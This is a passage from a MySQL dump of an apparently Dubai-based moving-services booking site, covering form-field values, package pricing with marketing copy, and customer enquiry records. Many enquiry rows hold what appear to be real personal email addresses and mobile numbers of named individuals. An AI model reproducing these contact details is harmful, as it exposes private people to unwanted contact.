(1924, 239, '20', '496'),
(1925, 239, '21', '2024-07-05'),
(1926, 239, '22', 'test'),
(1927, 240, '17', '51'),
(1928, 240, '45', 'tst label'),
(1929, 240, '18', '54'),
(1930, 240, '46', 'tst label'),
(1931, 240, '20', '56'),
(1932, 240, '21', '2024-06-09'),
(1933, 240, '22', 'Test'),
(1934, 241, '17', '51'),
(1935, 241, '57', '380'),
(1936, 241, '45', 'Layan'),
(1937, 241, '47', '494'),
(1938, 241, '48', 'Mumbai'),
(1939, 241, '46', 'Bandra'),
(1940, 241, '21', '2024-06-22'),
(1941, 242, '39', '125'),
(1942, 242, '40', '128'),
(1943, 242, '41', '2024-06-28'),
(1944, 242, '42', '129'),
(1945, 243, '17', '51'),
(1946, 243, '45', 'Layan Community'),
(1947, 243, '18', '54'),
(1948, 243, '46', 'Downtown');
INSERT INTO `more_formfields_details` (`id`, `package_inquiry_id`, `form_field_id`, `formfield_value`) VALUES
(1949, 243, '20', '56'),
(1950, 243, '21', '2024-06-16'),
(1951, 244, '17', '51'),
(1952, 244, '45', 'Layan'),
(1953, 244, '18', '54'),
(1954, 244, '46', 'Downtown'),
(1955, 244, '20', '56'),
(1956, 244, '21', '2024-06-16'),
(1957, 245, '17', '51'),
(1958, 245, '45', 'Layan'),
(1959, 245, '18', '55'),
(1960, 245, '46', 'Yas-Island'),
(1961, 245, '20', '56'),
(1962, 245, '21', '2024-06-29'),
(1963, 246, '17', '51'),
(1964, 246, '45', 'Layan'),
(1965, 246, '18', '55'),
(1966, 246, '46', 'Layan Community'),
(1967, 246, '20', '56'),
(1968, 246, '21', '2024-06-30'),
(1969, 247, '17', '51'),
(1970, 247, '45', 'test area'),
(1971, 247, '18', '68'),
(1972, 247, '46', 'test area2'),
(1973, 247, '20', '56'),
(1974, 247, '21', '2024-06-20'),
(1975, 247, '22', 'test spec'),
(1976, 248, '17', '51'),
(1977, 248, '45', 'test 123'),
(1978, 248, '18', '69'),
(1979, 248, '46', 'AD'),
(1980, 248, '20', '496'),
(1981, 248, '21', '2024-06-20'),
(1982, 248, '22', '1234'),
(1983, 249, '45', 'test 123'),
(1984, 249, '18', '69'),
(1985, 249, '46', 'AD'),
(1986, 249, '20', '73'),
(1987, 249, '21', '2024-06-21'),
(1988, 249, '22', 'Villa testing'),
(1989, 250, '17', '53'),
(1990, 250, '45', 'test 123'),
(1991, 250, '18', '69'),
(1992, 250, '46', 'AD'),
(1993, 250, '20', '73'),
(1994, 250, '21', '2024-06-30'),
(1995, 250, '22', 'test 19 jun'),
(1996, 251, '17', '52'),
(1997, 251, '45', 'tst label dev'),
(1998, 251, '18', '54'),
(1999, 251, '46', 'tst label'),
(2000, 251, '20', '73'),
(2001, 251, '21', '2024-06-14'),
(2002, 252, '17', '51'),
(2003, 252, '45', 'tst label dev'),
(2004, 252, '18', '54'),
(2005, 252, '46', 'tst label'),
(2006, 252, '20', '56'),
(2007, 252, '21', '2024-06-13'),
(2008, 252, '22', 'sf'),
(2009, 253, '39', '125'),
(2010, 253, '40', '653'),
(2011, 253, '41', '2024-06-22'),
(2012, 253, '42', '129'),
(2013, 253, '59', 'Dubai'),
(2014, 253, '32', 'ee'),
(2015, 254, '39', '125'),
(2016, 254, '40', '128'),
(2017, 254, '41', '2024-06-03'),
(2018, 254, '42', '130'),
(2019, 254, '59', 'vehicle 1'),
(2020, 254, '60', 'vehicle 2'),
(2021, 254, '32', 'tesg'),
(2022, 255, '39', '125'),
(2023, 255, '40', '653'),
(2024, 255, '41', '2024-06-21'),
(2025, 255, '42', '131'),
(2026, 255, '59', 'test'),
(2027, 255, '60', 'teee'),
(2028, 255, '64', 'eee'),
(2029, 255, '32', 'tetstt');

-- --------------------------------------------------------

--
-- Table structure for table `more_formfields_details_att`
--

CREATE TABLE `more_formfields_details_att` (
  `id` int(11) NOT NULL,
  `package_inquiry_id` int(11) NOT NULL DEFAULT '0',
  `form_id` int(11) NOT NULL,
  `more_form_attributes_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `more_formfields_details_att`
--

INSERT INTO `more_formfields_details_att` (`id`, `package_inquiry_id`, `form_id`, `more_form_attributes_id`) VALUES
(1, 79, 20, 20),
(2, 80, 20, 20),
(3, 81, 20, 20),
(4, 82, 20, 21),
(5, 83, 20, 20),
(6, 84, 20, 25),
(7, 85, 20, 20),
(8, 86, 20, 21),
(9, 87, 20, 21),
(10, 88, 20, 20),
(11, 101, 20, 25),
(12, 102, 20, 22),
(13, 103, 20, 27),
(14, 104, 20, 24),
(15, 107, 20, 20),
(16, 108, 20, 21),
(17, 109, 20, 28),
(18, 110, 20, 21),
(19, 114, 20, 21),
(20, 115, 20, 25),
(21, 116, 20, 20),
(22, 117, 20, 20),
(23, 118, 20, 21),
(24, 119, 20, 25),
(25, 120, 20, 28),
(26, 121, 20, 20),
(27, 122, 20, 20),
(28, 123, 20, 25),
(29, 124, 20, 23),
(30, 127, 20, 20),
(31, 128, 20, 28),
(32, 129, 20, 21),
(33, 130, 20, 21),
(34, 131, 20, 20),
(35, 133, 20, 20),
(36, 135, 35, 29),
(37, 135, 35, 30),
(38, 135, 35, 31),
(39, 141, 20, 22),
(40, 144, 20, 28),
(41, 147, 20, 20),
(42, 149, 35, 29),
(43, 149, 35, 31),
(44, 149, 35, 32),
(45, 150, 20, 21),
(46, 151, 35, 29),
(47, 151, 35, 30),
(48, 153, 20, 21),
(49, 154, 20, 22),
(50, 157, 20, 25),
(51, 159, 20, 21),
(52, 160, 20, 26),
(53, 161, 20, 21),
(54, 167, 20, 22),
(55, 168, 20, 22),
(56, 169, 20, 24),
(57, 171, 20, 24),
(58, 175, 20, 26),
(59, 177, 20, 25),
(60, 178, 20, 25),
(61, 180, 20, 24),
(62, 182, 20, 21),
(63, 185, 20, 23),
(64, 188, 20, 25),
(65, 189, 20, 21),
(66, 190, 20, 24),
(67, 191, 20, 20),
(68, 192, 20, 22),
(69, 193, 20, 23),
(70, 194, 20, 27),
(71, 196, 20, 22),
(72, 197, 20, 24),
(73, 209, 20, 27),
(74, 210, 20, 25),
(75, 211, 20, 25),
(76, 212, 20, 25),
(77, 213, 20, 21),
(78, 215, 20, 28),
(79, 219, 20, 21),
(80, 223, 20, 22),
(81, 230, 20, 26),
(82, 232, 20, 28),
(83, 234, 20, 21),
(84, 235, 20, 25),
(85, 237, 20, 21),
(86, 238, 20, 28),
(87, 240, 20, 21),
(88, 243, 20, 22),
(89, 244, 20, 22),
(90, 245, 20, 22),
(91, 246, 20, 24),
(92, 247, 20, 20),
(93, 252, 20, 21);

-- --------------------------------------------------------

--
-- Table structure for table `more_form_attributes`
--

CREATE TABLE `more_form_attributes` (
  `id` int(11) NOT NULL,
  `form_id` varchar(255) DEFAULT NULL,
  `attr_id` varchar(255) DEFAULT NULL,
  `more_form_option` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `more_form_attributes`
--

INSERT INTO `more_form_attributes` (`id`, `form_id`, `attr_id`, `more_form_option`) VALUES
(1, '49', '146', 'Studio'),
(2, '49', '146', '1BR'),
(3, '49', '146', '2BR'),
(4, '49', '146', '3BR'),
(6, '49', '147', '2BR'),
(7, '49', '147', '3BR'),
(8, '49', '147', '4BR'),
(9, '49', '147', '5BR'),
(11, '50', '148', 'Studio'),
(12, '50', '148', '1BR'),
(13, '50', '148', '2BR'),
(14, '50', '148', '3BR'),
(15, '50', '148', '4BR'),
(16, '50', '149', '2BR'),
(17, '50', '149', '3BR'),
(18, '50', '149', '4BR'),
(19, '50', '149', '5BR'),
(20, '20', '56', 'Studio'),
(21, '20', '56', '1 BR'),
(22, '20', '56', '2 BR'),
(23, '20', '56', '3 BR'),
(24, '20', '56', '4 BR'),
(25, '20', '57', '2 BR'),
(26, '20', '57', '3 BR'),
(27, '20', '57', '4 BR'),
(28, '20', '57', '5 BR'),
(29, '35', '111', 'Monday'),
(30, '35', '111', 'Tuesday'),
(31, '35', '111', 'Wednesday'),
(32, '35', '111', 'Thursday'),
(33, '35', '111', 'Friday'),
(34, '35', '111', 'Saturday'),
(35, '35', '111', 'Sunday'),
(36, '20', '73', 'Few Furnitures Move'),
(37, '20', '73', 'Full Office Move'),
(38, '20', '496', 'Few Furnitures Move'),
(39, '20', '496', 'Full Office Move'),
(40, '63', '658', 'Studio'),
(41, '63', '658', '1 BR'),
(42, '63', '658', '2 BR'),
(43, '63', '658', '3 BR'),
(44, '63', '658', '4 BR'),
(45, '63', '659', '2 BR'),
(46, '63', '659', '3 BR'),
(47, '63', '659', '4 BR'),
(48, '63', '659', '5 BR');

-- --------------------------------------------------------

--
-- Table structure for table `packages`
--

CREATE TABLE `packages` (
  `id` int(11) NOT NULL,
  `service_id` varchar(255) NOT NULL,
  `subservice_id` varchar(255) NOT NULL,
  `packagecategory_id` varchar(255) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `sub_title` varchar(255) DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `page_url` varchar(255) DEFAULT NULL,
  `price` int(11) NOT NULL,
  `image` varchar(255) NOT NULL,
  `short_description` text,
  `description` text,
  `discount` varchar(255) DEFAULT NULL,
  `discount_type` int(11) DEFAULT NULL COMMENT '0-Percentage,1-Price,2-None',
  `set_order` int(11) DEFAULT '0',
  `booking_service_per` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `packages`
--

INSERT INTO `packages` (`id`, `service_id`, `subservice_id`, `packagecategory_id`, `title`, `sub_title`, `name`, `page_url`, `price`, `image`, `short_description`, `description`, `discount`, `discount_type`, `set_order`, `booking_service_per`) VALUES
(21, '30', '23', '18', 'Studio', 'Budget', 'Studio | Budget', 'studio-budget', 735, '1708848958international-move.jpg', NULL, '<p>Experience a hassle-free relocation with VendorsCity\'s specialized Studio Budget Move package. Our comprehensive service includes a 3-Ton Closed Truck, accompanied by a dedicated team of 2 skilled helpers. We go the extra mile with White Goods Connection and expert Dismantling &amp; Assembly services, ensuring a smooth transition to your new home.</p>', NULL, 2, 1, NULL),
(22, '30', '23', '18', 'Studio', 'Standard', 'Studio | Standard', 'studio-standard', 840, '1708849758international-move.jpg', NULL, '<p>Embark on a stress-free relocation journey with VendorsCity\'s Studio Standard Move. Our all-inclusive package features a 3-Ton Closed Truck, a skilled team of 2 Helpers, and an Installer to ensure a seamless transition to your new space. Benefit from White Goods Connection, Dismantling &amp; Assembly services, and receive the necessary Boxes for a well-organized move.</p>', NULL, 2, 2, NULL),
(23, '30', '23', '18', 'Studio', 'Premium', 'Studio | Premium', 'studio-premium', 945, '1708850376international-move.jpg', NULL, '<p>Experience a move like never before with VendorsCity\'s Studio Premium package, meticulously designed to exceed your expectations. Our comprehensive service includes a 3-Ton Closed Truck, a dedicated team of 2 Helpers, and a skilled Installer to ensure a seamless transition to your studio. Enjoy the convenience of White Goods Connection, expert Dismantling &amp; Assembly, and receive top-notch Boxes for a well-organized move.</p>', NULL, 2, 3, NULL),
(25, '30', '23', '18', '1 BR', 'Budget', '1 BR Apartment | Budget', '1-br-apartment-budget', 945, '', NULL, '<p>Your trusted partner for hassle-free 1 Bedroom Budget Moves. Our all-inclusive package features a 3-Ton Closed Truck, accompanied by a skilled team of 3 helpers. We go the extra mile by providing White Goods Connection, Dismantling, and Assembly services, ensuring a seamless transition to your new home. Please note that insurance is offered separately, and this package does not include handyman assistance.&nbsp;</p>', NULL, 2, 4, NULL),
(26, '30', '23', '18', '1 BR', 'Standard', '1 BR Apartment | Standard', '1-br-apartment-standard', 1155, '', NULL, '<p>Our comprehensive package includes a 3-Ton Closed Truck, a proficient team of 3 helpers, and an experienced installer. We take care of every detail with White Goods Connection, Dismantling &amp; Assembly services, and provide essential boxes for your convenience. Please note that our services do not cover handyman assistance, and insurance is offered separately.</p>', NULL, 2, 5, NULL),
(27, '30', '23', '18', '1 BR', 'Premium', '1 BR Apartment | Premium', '1-br-apartment-premium', 1365, '', NULL, '<p>Our exclusive package offers a 3-Ton Closed Truck, a dedicated team of 3 helpers, and a skilled installer for a seamless experience. Enjoy the added luxury of White Goods Connection, Dismantling &amp; Assembly services, and receive essential boxes to streamline your move. With the inclusion of a handyman, we go above and beyond to ensure a worry-free transition. Please note that insurance is offered separately.</p>', NULL, 2, 6, NULL),
(28, '30', '23', '18', '2 BR', 'Budget', '2 BR Apartment | Budget', '2-br-apartment-budget', 1575, '', NULL, '<p>Our comprehensive package features two 3-Ton Closed Trucks accompanied by a dedicated team of 5 skilled helpers. We prioritize your convenience with White Goods Connection and expert Dismantling &amp; Assembly services. While boxes are available separately, please note that our services do not include handyman assistance, and insurance can be acquired separately.</p>', NULL, 2, 7, NULL),
(29, '30', '23', '18', '2 BR', 'Standard', '2 BR Apartment | Standard', '2-br-apartment-standard', 1999, '', NULL, '<p>Our all-inclusive package features two 3-Ton Closed Trucks and a skilled team of 6 helpers, ensuring a smooth transition to your new space. Benefit from White Goods Connection, an experienced installer, and expert Dismantling &amp; Assembly services. Boxes are available separately for added convenience. Please note that handyman services are excluded, and insurance can be obtained separately.</p>', NULL, 2, 8, NULL),
(30, '30', '23', '18', '2 BR', 'Premium', '2 BR Apartment | Premium', '2-br-apartment-premium', 2410, '', NULL, '<p>Elevate your moving experience with our exclusive package, featuring two 3-Ton Closed Trucks and a dedicated team of 7 helpers. Enjoy the convenience of White Goods Connection, an expert installer, and meticulous Dismantling &amp; Assembly services. Enhance your packing with optional boxes, available separately, and experience the luxury of included handyman services. Rest easy knowing that insurance is offered separately.</p>', NULL, 2, 9, NULL),
(31, '30', '23', '18', '3 BR', 'Budget', '3 BR Apartment | Budget', '3-br-apartment-budget', 2625, '', NULL, '<p>Our comprehensive package includes two 3-Ton Closed Trucks and a dedicated team of 7 helpers to ensure a smooth transition to your new 3-bedroom home. Benefit from White Goods Connection and expert Dismantling &amp; Assembly services, all tailored to your needs. Please note that boxes are available separately, and our services do not include handyman services or 2 installers. Insurance can be obtained separately for added peace of mind.</p>', NULL, 2, 10, NULL),
(32, '30', '23', '18', '3 BR', 'Standard', '3 BR Apartment | Standard', '3-br-apartment-standard', 2840, '', NULL, '<p>Our package boasts three 3-Ton Closed Trucks, accompanied by a dedicated team of 7 helpers and the expertise of 2 installers. Enjoy the convenience of White Goods Connection, precise Dismantling &amp; Assembly services, and essential boxes to simplify your move. Please note that our services do not include handyman assistance, and insurance can be obtained separately.</p>', NULL, 2, 11, NULL),
(33, '30', '23', '18', '3 BR', 'Premium', '3 BR Apartment | Premium', '3-br-apartment-premium', 3470, '', NULL, '<p>Experience the epitome of moving excellence with three 3-Ton Closed Trucks, a dedicated team of 8 helpers, and the expertise of 2 installers. Our package includes White Goods Connection, meticulous Dismantling &amp; Assembly, and the added convenience of handyman services. Simplify your packing with provided boxes, while insurance is available separately for your peace of mind.</p>', NULL, 2, 12, NULL),
(34, '30', '23', '18', '4 BR', 'Budget', '4 BR Apartment | Budget', '4-br-apartment-budget', 3050, '', NULL, '<p>Our comprehensive package encompasses four 3-Ton Closed Trucks and a skilled team of 10 helpers, ensuring a seamless transition to your new 4-bedroom home. Benefit from White Goods Connection and expert Dismantling &amp; Assembly services tailored to your needs. Please note that our services do not include handyman assistance, boxes, or 2 installers. Insurance can be obtained separately for added peace of mind.</p>', NULL, 2, 13, NULL),
(35, '30', '23', '18', '4 BR', 'Standard', '4 BR Apartment | Standard', '4-br-apartment-standard', 3990, '', NULL, '<p>Our all-inclusive package features four 3-Ton Closed Trucks, a dedicated team of 12 helpers, and the expertise of 2 installers. Enjoy the convenience of White Goods Connection, precise Dismantling &amp; Assembly, and the added ease of provided boxes. While our services do not include handyman assistance, insurance is available separately for your peace of mind.</p>', NULL, 2, 14, NULL),
(36, '30', '23', '18', '4 BR', 'Premium', '4 BR Apartment | Premium', '4-br-apartment-premium', 4620, '', NULL, '<p>Elevate your moving experience with our exclusive package, featuring four 3-Ton Closed Trucks, a dedicated team of 14 helpers, and the expertise of 2 installers. Enjoy the convenience of White Goods Connection, meticulous Dismantling &amp; Assembly, and the added ease of provided boxes. Experience luxury with included handyman services, ensuring a worry-free transition. Please note that insurance is available separately.</p>', NULL, 2, 15, NULL),
(37, '30', '26', '17', '3 BR', 'Budget', '3 BR Villa | Budget', '3-br-villa-budget', 2420, '', NULL, '<p>Our inclusive package features three 3-Ton Open Trucks, along with a skilled team of 8 helpers, ensuring a seamless transition to your new villa. Benefit from White Goods Connection and Furniture Dismantling &amp; Assembly services tailored to your needs. While our services do not include 2 installers, boxes, or handyman assistance, these options are available separately for your convenience. Insurance can also be obtained separately.</p>', NULL, 2, 1, NULL),
(38, '30', '26', '17', '3 BR', 'Standard', '3 BR Villa | Standard', '3-br-villa-standard', 2940, '', NULL, '<p>Our comprehensive package includes three 3-Ton Open Trucks, a dedicated team of 9 helpers, and the expertise of 2 installers to ensure a smooth transition to your villa. Enjoy the convenience of White Goods Connection and meticulous Furniture Dismantling &amp; Assembly. We also provide essential boxes to simplify your packing process. Please note that our services do not include handyman assistance, and insurance is offered separately.</p>', NULL, 2, 2, NULL),
(39, '30', '26', '17', '3 BR', 'Premium', '3 BR Villa | Premium', '3-br-villa-premium', 3470, '', NULL, '<p>Experience the epitome of relocation excellence with three 3-Ton Closed Trucks, a dedicated team of 10 helpers, and the expertise of 2 installers. Enjoy the convenience of White Goods Connection, meticulous Dismantling &amp; Assembly, and simplify your packing with provided boxes. We go the extra mile with included handyman services, ensuring a worry-free transition. Please note that insurance is available separately.</p>', NULL, 2, 3, NULL),
(40, '30', '26', '17', '4 BR', 'Budget', '4 BR Villa | Budget', '4-br-villa-budget', 3045, '', NULL, '<p>Our comprehensive package includes four 3-Ton Closed Trucks, a dedicated team of 10 helpers, and essential services such as White Goods Connection and meticulous Dismantling &amp; Assembly. While insurance and boxes are available separately, please note that our services do not include 2 installers or handyman assistance.</p>', NULL, 2, 4, NULL),
(41, '30', '26', '17', '4 BR', 'Standard', '4 BR Villa | Standard', '4-br-villa-standard', 3990, '', NULL, '<p>Our comprehensive package includes four 3-Ton Closed Trucks, a dedicated team of 12 helpers, and the expertise of 2 installers to ensure a smooth transition to your villa. Enjoy the convenience of White Goods Connection, meticulous Dismantling &amp; Assembly, and simplify your packing with provided boxes. Please note that our services do not include handyman assistance, and insurance is available separately.</p>', NULL, 2, 5, NULL),
(42, '30', '26', '17', '4 BR', 'Premium', '4 BR Villa | Premium', '4-br-villa-premium', 4620, '', NULL, '<p>Our exclusive package features four 3-Ton Closed Trucks, a dedicated team of 14 helpers, and the expertise of 2 installers to ensure a seamless transition to your villa. Enjoy the convenience of White Goods Connection, meticulous Dismantling &amp; Assembly, and simplify your packing with provided boxes. Elevate your moving experience with included handyman services. Please note that insurance is available separately.</p>', NULL, 2, 6, NULL),
(43, '30', '26', '17', '5 BR', 'Budget', '5 BR Villa | Budget', '5-br-villa-budget', 3890, '', NULL, '<p>Our comprehensive package includes five 3-Ton Closed Trucks, a dedicated team of 13 helpers, and essential services such as White Goods Connection and meticulous Dismantling &amp; Assembly. While insurance and boxes are available separately, please note that our services do not include 2 installers or handyman assistance.</p>', NULL, 2, 7, NULL),
(44, '30', '26', '17', '5 BR', 'Standard', '5 BR Villa | Standard', '5-br-villa-standard', 5145, '', NULL, '<p>Our comprehensive package includes five 3-Ton Closed Trucks, a dedicated team of 15 helpers, and the expertise of 2 installers to ensure a smooth transition to your villa. Enjoy the convenience of White Goods Connection, meticulous Dismantling &amp; Assembly, and simplify your packing with provided boxes. Please note that our services do not include handyman assistance, and insurance is available separately.</p>', NULL, 2, 8, NULL),
(45, '30', '26', '17', '5 BR', 'Premium', '5 BR Villa | Premium', '5-br-villa-premium', 5780, '', NULL, '<p>Our exclusive package features five 3-Ton Closed Trucks, an extensive team of 18 helpers, and the expertise of 2 installers to ensure a seamless transition to your villa. Enjoy the convenience of White Goods Connection, meticulous Dismantling &amp; Assembly, and simplify your packing with provided boxes. Elevate your moving experience with included handyman services. Please note that insurance is available separately.</p>', NULL, 2, 9, NULL),
(46, '45', '29', '21', 'Studio', 'Studio', 'Studio', 'studio', 299, '', NULL, NULL, NULL, 2, 0, NULL),
(47, '45', '29', '21', '1 Bedroom Apartment', '1 Bedroom Apartment', '1 Bedroom Apartment', '1-bedroom-apartment', 399, '', NULL, NULL, NULL, 2, 0, NULL),
(48, '45', '29', '21', '2 Bedroom Apartment', '2 Bedroom Apartment', '2 Bedroom Apartment', '2-bedroom-apartment', 499, '', NULL, NULL, NULL, 2, 0, NULL),
(49, '45', '29', '21', '3 Bedroom Apartment', '3 Bedroom Apartment', '3 Bedroom Apartment', '3-bedroom-apartment', 799, '', NULL, NULL, NULL, 2, 0, NULL),
(50, '45', '29', '21', '4 Bedroom Apartment', '4 Bedroom Apartment', '4 Bedroom Apartment', '4-bedroom-apartment', 999, '', NULL, NULL, NULL, 2, 0, NULL),
(51, '45', '29', '21', '5 Bedroom Apartment', '5 Bedroom Apartment', '5 Bedroom Apartment', '5-bedroom-apartment', 1299, '', NULL, NULL, NULL, 2, 0, NULL),
(52, '45', '29', '22', '2 Bedroom Villa', '2 Bedroom Villa', '2 Bedroom Villa', '2-bedroom-villa', 799, '', NULL, NULL, NULL, 2, 0, NULL),
(53, '45', '29', '22', '3 Bedroom Villa', '3 Bedroom Villa', '3 Bedroom Villa', '3-bedroom-villa', 999, '', NULL, NULL, NULL, 2, 0, NULL),
(54, '45', '29', '22', '4 Bedroom Villa', '4 Bedroom Villa', '4 Bedroom Villa', '4-bedroom-villa', 1299, '', NULL, NULL, NULL, 2, 0, NULL),
(55, '45', '29', '22', '5 Bedroom Villa', '5 Bedroom Villa', '5 Bedroom Villa', '5-bedroom-villa', 1699, '', NULL, NULL, NULL, 2, 0, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `packages_enquiry`
--

CREATE TABLE `packages_enquiry` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `pakage_id` int(11) NOT NULL,
  `service_id` int(11) NOT NULL,
  `subservice_id` int(11) NOT NULL,
  `packagecategory_id` int(11) NOT NULL,
  `email` varchar(255) NOT NULL,
  `mobile` varchar(255) NOT NULL,
  `accept_vendor_id` int(11) NOT NULL DEFAULT '0',
  `is_accept` int(11) NOT NULL DEFAULT '0' COMMENT '(0= not approve 1= Approve)',
  `added_date` date NOT NULL,
  `count` int(11) DEFAULT '0',
  `form_type` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `packages_enquiry`
--

INSERT INTO `packages_enquiry` (`id`, `name`, `pakage_id`, `service_id`, `subservice_id`, `packagecategory_id`, `email`, `mobile`, `accept_vendor_id`, `is_accept`, `added_date`, `count`, `form_type`) VALUES
(1, 'john', 11, 16, 18, 7, 'mayudin1904@gmail.com', '7897897899', 0, 0, '2023-12-27', 1, NULL),
(2, 'john', 11, 16, 18, 7, 'mayudin1904@gmail.com', '7897897899', 0, 0, '2023-12-27', 3, NULL),
(3, 'mayudin', 10, 16, 18, 7, 'mayudin1904@gmail.com', '7897897899', 0, 0, '2023-12-27', 0, NULL),
(4, 'dev patel', 11, 16, 18, 7, 'rajnikant.patel87@gmail.com', '9033259413', 0, 0, '2024-01-10', 1, NULL),
(5, 'dev patel', 15, 22, 21, 11, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-01-17', 1, NULL),
(45, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-15', 0, NULL),
(46, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-15', 1, NULL),
(64, 'dev', 0, 30, 26, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-16', 0, NULL),
(65, '', 0, 30, 26, 0, '', '', 0, 0, '2024-03-16', 0, NULL),
(68, 'hitesh', 0, 30, 26, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-16', 0, NULL),
(69, 'hitesh', 0, 30, 26, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-16', 1, NULL),
(70, '', 0, 30, 26, 0, '', '', 0, 0, '2024-03-16', 0, NULL),
(71, '', 0, 30, 26, 0, '', '', 0, 0, '2024-03-16', 0, NULL),
(72, '', 0, 30, 26, 0, '', '', 0, 0, '2024-03-16', 0, NULL),
(73, '', 0, 30, 26, 0, '', '', 0, 0, '2024-03-18', 0, NULL),
(74, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-18', 0, NULL),
(75, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-18', 0, NULL),
(76, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-18', 0, NULL),
(77, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-18', 0, NULL),
(78, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-18', 0, NULL),
(79, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(80, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(81, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(82, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(83, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(84, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(85, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-22', 0, NULL),
(86, '', 0, 30, 26, 0, '', '', 0, 0, '2024-03-22', 0, NULL),
(87, 'hitesh', 0, 30, 26, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-22', 0, NULL),
(88, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-23', 0, NULL),
(89, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-26', 0, NULL),
(90, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-26', 0, NULL),
(91, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-27', 0, NULL),
(92, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-27', 0, NULL),
(93, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-27', 0, NULL),
(94, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-27', 0, NULL),
(95, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(96, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(97, '', 0, 44, 61, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(98, '', 0, 44, 61, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(99, '', 0, 45, 28, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(100, '', 0, 45, 33, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(101, '', 0, 30, 23, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(102, 'Nikul Patel', 0, 30, 26, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-03-28', 0, NULL),
(103, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-28', 0, NULL),
(104, 'hitesh', 0, 30, 53, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-28', 0, NULL),
(105, 'Nikul Patel', 0, 30, 26, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-03-28', 0, NULL),
(106, '', 0, 43, 60, 0, '', '', 0, 0, '2024-03-28', 0, NULL),
(107, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(108, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(109, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(110, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(111, 'hitesh', 0, 44, 61, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(112, 'hitesh', 0, 45, 28, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(113, 'hitesh', 0, 44, 63, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 1, NULL),
(114, 'hitesh', 0, 30, 26, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-29', 0, NULL),
(115, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-03-30', 0, NULL),
(116, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(117, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(118, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
